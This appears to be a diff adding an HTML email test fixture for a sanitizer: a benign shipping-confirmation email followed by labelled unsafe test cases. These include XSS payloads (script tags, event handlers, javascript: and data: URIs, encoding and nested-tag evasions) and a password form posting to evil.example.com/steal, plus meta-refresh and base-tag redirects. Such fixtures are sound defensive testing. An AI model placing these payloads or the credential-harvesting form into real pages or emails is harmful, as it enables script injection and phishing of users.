@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sanitization Test Email</title>
+  <!-- TEST: <style> blocks are often stripped by sanitizers -->
+  <style>
+    body { background: #ff0000 !important; }
+  </style>
+</head>
+<body style="margin:0; padding:0; background-color:#eef2f5; font-family:Georgia, 'Times New Roman', serif;">
+
+  <!-- ========== PART 1: SAFE CONTENT (should survive sanitization) ========== -->
+  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:#eef2f5;">
+    <tr>
+      <td align="center" style="padding:32px 12px;">
+        <table role="presentation" width="600" cellpadding="0" cellspacing="0" border="0" style="max-width:600px; width:100%; background-color:#ffffff; border:1px solid #d5dde3; border-radius:6px;">
+
+          <!-- Header -->
+          <tr>
+            <td style="background-color:#1f4e5f; padding:28px 32px; border-radius:6px 6px 0 0;">
+              <h1 style="margin:0; color:#ffffff; font-size:26px; font-weight:normal; letter-spacing:0.5px;">Your order has shipped</h1>
+              <p style="margin:6px 0 0; color:#b9d6df; font-size:14px;">Order #10482 · Placed September 28, 2026</p>
+            </td>
+          </tr>
+
+          <!-- Body text with mixed inline formatting -->
+          <tr>
+            <td style="padding:28px 32px; color:#2b2b2b; font-size:16px; line-height:1.6;">
+              <p style="margin:0 0 16px;">Hi Ama,</p>
+              <p style="margin:0 0 16px;">
+                Good news — your package is on its way. It should arrive by
+                <strong style="color:#1f4e5f;">Friday, October 3</strong>.
+                You can <em>track it</em> anytime, and <u>underlined text</u>,
+                <span style="background-color:#fff3b0; padding:0 3px;">highlighted text</span>,
+                <s>struck text</s>, and <code style="font-family:Courier, monospace; background:#f2f2f2; padding:1px 4px;">inline code</code> should all render.
+              </p>
+
+              <!-- Button -->
+              <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="margin:24px 0;">
+                <tr>
+                  <td style="background-color:#e07a2f; border-radius:4px;">
+                    <a href="https://example.com/track/10482" target="_blank" style="display:inline-block; padding:12px 26px; color:#ffffff; text-decoration:none; font-family:Arial, sans-serif; font-size:15px; font-weight:bold;">Track package</a>
+                  </td>
+                </tr>
+              </table>
+
+              <!-- List -->
+              <h2 style="margin:0 0 10px; font-size:18px; color:#1f4e5f;">What's in the box</h2>
+              <ul style="margin:0 0 20px; padding-left:20px;">
+                <li style="margin-bottom:6px;">Wireless headphones (black)</li>
+                <li style="margin-bottom:6px;">USB-C charging cable</li>
+                <li>Carrying case</li>
+              </ul>
+
+              <!-- Data table -->
+              <table width="100%" cellpadding="8" cellspacing="0" border="0" style="border-collapse:collapse; font-family:Arial, sans-serif; font-size:14px; margin-bottom:20px;">
+                <tr style="background-color:#f4f7f9;">
+                  <th align="left" style="border-bottom:2px solid #d5dde3; color:#555;">Item</th>
+                  <th align="center" style="border-bottom:2px solid #d5dde3; color:#555;">Qty</th>
+                  <th align="right" style="border-bottom:2px solid #d5dde3; color:#555;">Price</th>
+                </tr>
+                <tr>
+                  <td style="border-bottom:1px solid #eee;">Wireless headphones</td>
+                  <td align="center" style="border-bottom:1px solid #eee;">1</td>
+                  <td align="right" style="border-bottom:1px solid #eee;">GH₵ 850.00</td>
+                </tr>
+                <tr>
+                  <td style="border-bottom:1px solid #eee;">Shipping</td>
+                  <td align="center" style="border-bottom:1px solid #eee;">—</td>
+                  <td align="right" style="border-bottom:1px solid #eee;">GH₵ 40.00</td>
+                </tr>
+                <tr>
+                  <td colspan="2" style="font-weight:bold;">Total</td>
+                  <td align="right" style="font-weight:bold; color:#1f4e5f;">GH₵ 890.00</td>
+                </tr>
+              </table>
+
+              <!-- Image (https, should be allowed) -->
+              <img src="https://via.placeholder.com/536x120.png?text=Product+Image" alt="Product banner" width="536" style="display:block; max-width:100%; height:auto; border:0; margin-bottom:20px;">
+
+              <!-- Blockquote -->
+              <blockquote style="margin:0 0 20px; padding:10px 16px; border-left:4px solid #e07a2f; background-color:#fdf5ef; color:#555; font-style:italic;">
+                Tip: keep your receipt for warranty claims.
+              </blockquote>
+
+              <hr style="border:0; border-top:1px solid #e3e3e3; margin:24px 0;">
+              <p style="margin:0; font-size:13px; color:#888;">
+                Questions? Reply to this email or visit
+                <a href="https://example.com/help" style="color:#1f4e5f;">our help center</a>.
+              </p>
+            </td>
+          </tr>
+
+          <!-- ========== PART 2: UNSAFE CONTENT (should be stripped/neutralized) ========== -->
+          <tr>
+            <td style="padding:20px 32px; background-color:#fff7f7; border-top:1px dashed #e0a0a0; font-family:Arial, sans-serif; font-size:13px; color:#7a2e2e;">
+              <p style="margin:0 0 10px; font-weight:bold;">Sanitizer test cases below — none of these should execute or survive intact:</p>
+
+              <!-- 1. Script tag -->
+              <script>alert('XSS: script tag');</script>
+
+              <!-- 2. Event handler attributes -->
+              <img src="x" onerror="alert('XSS: img onerror')" alt="onerror test">
+              <div onclick="alert('XSS: onclick')" onmouseover="alert('XSS: onmouseover')" style="padding:4px;">Hover or click me (handlers should be removed)</div>
+
+              <!-- 3. javascript: URLs -->
+              <p><a href="javascript:alert('XSS: javascript href')">javascript: link</a></p>
+              <p><a href="JaVaScRiPt:alert('XSS: mixed case')">Mixed-case javascript: link</a></p>
+              <p><a href="&#106;avascript:alert('XSS: entity encoded')">Entity-encoded javascript: link</a></p>
+              <p><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTOiBkYXRhIFVSSScpPC9zY3JpcHQ+">data: URI link</a></p>
+
+              <!-- 4. Dangerous CSS -->
+              <div style="background-image:url('javascript:alert(1)'); width:10px; height:10px;"></div>
+              <div style="width:expression(alert('XSS: IE expression'));">CSS expression()</div>
+              <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:red; z-index:9999;">Overlay attempt (position:fixed should be stripped)</div>
+
+              <!-- 5. Embedding elements -->
+              <iframe src="https://example.com" width="200" height="50"></iframe>
+              <object data="https://example.com/file.swf"></object>
+              <embed src="https://example.com/file.swf">
+
+              <!-- 6. SVG-based -->
+              <svg onload="alert('XSS: svg onload')" width="10" height="10"></svg>
+
+              <!-- 7. Forms (phishing risk) -->
+              <form action="https://evil.example.com/steal" method="POST">
+                <input type="password" name="pw" placeholder="Enter your password">
+                <button type="submit">Log in</button>
+              </form>
+
+              <!-- 8. Meta refresh / base tag -->
+              <meta http-equiv="refresh" content="0;url=https://evil.example.com">
+              <base href="https://evil.example.com/">
+
+              <!-- 9. Broken/nested tag trickery -->
+              <scr<script>ipt>alert('XSS: nested')</scr</script>ipt>
+              <img src="x" alt="&quot; onerror=&quot;alert('XSS: attr breakout')">
+
+              <!-- 10. Tracking pixel (decide if your app allows remote images) -->
+              <img src="https://example.com/pixel.gif?uid=12345" width="1" height="1" alt="" style="display:none;">
+
+              <p style="margin:10px 0 0;">End of test cases.</p>
+            </td>
+          </tr>
+
+        </table>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>
